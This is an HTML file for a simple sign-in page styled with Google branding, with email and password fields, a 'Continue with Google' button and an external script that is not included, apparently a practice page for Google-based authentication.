<!doctype html>
<html lang="en">
    <head>
        <title>Google Login Form</title>
        <!-- Required meta tags -->
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

        <link
        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
        crossorigin="anonymous"
    />        <style>
              body {
                font-family: 'Roboto', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background-color: #f5f5f5;
            }
            .login-container {
                background-color: #ffffff;
                border: 1px solid #ddd;
                padding: 40px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 8px;
                width: 100%;
                max-width: 360px;
                text-align: center;
            }
            .login-container img {
                width: 75px;
                margin-bottom: 20px;
            }
            .login-container h2 {
                font-size: 24px;
                margin-bottom: 20px;
                color: #202124;
            }
            .login-container input[type="email"],
            .login-container input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
            }
            .login-container .btn-primary {
                width: 100%;
                padding: 10px;
                background-color: #1a73e8;
                border: none;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                cursor: pointer;
            }
            .login-container .btn-primary:hover {
                background-color: #1666c0;
            }
            .login-container .forgot-password {
                margin-top: 15px;
                font-size: 14px;
                color: #1a73e8;
            }
            .login-container .forgot-password:hover {
                text-decoration: underline;
                cursor: pointer;
            }
            .login-container .btn-google {
                background-color: #ffffff;
                color: #5f6368;
                border: 1px solid #ddd;
                width: 100%;
                padding: 10px;
                border-radius: 4px;
                font-size: 16px;
                margin-top: 10px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .login-container .btn-google img {
                width: 20px;
                margin-right: 10px;
            }
            .login-container .btn-google:hover {
                background-color: #f8f9fa;
            }
            .login-container .btn-logout {
                display: none; /* Initially hidden */
                width: 100%;
                padding: 10px;
                background-color: #e53935;
                border: none;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                cursor: pointer;
                margin-top: 10px;
            }
            .login-container .btn-logout:hover {
                background-color: #d32f2f;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google Logo">
            <h2>Sign in</h2>
            <form>
                <input type="email" class="form-control" placeholder="Email or phone" required>
                <input type="password" class="form-control" placeholder="Enter your password" required>
                <button type="submit" class="btn btn-primary">Next</button>
            </form>
            <button class="btn btn-google mt-3" id="google-login-btn">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google Icon">
                Continue with Google
            </button>
            <div class="forgot-password">Forgot password?</div>
        </div>

        <!-- Bootstrap JavaScript Libraries -->
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
        <script type="module" src="./script1.js"></script>
    </body>
</html>
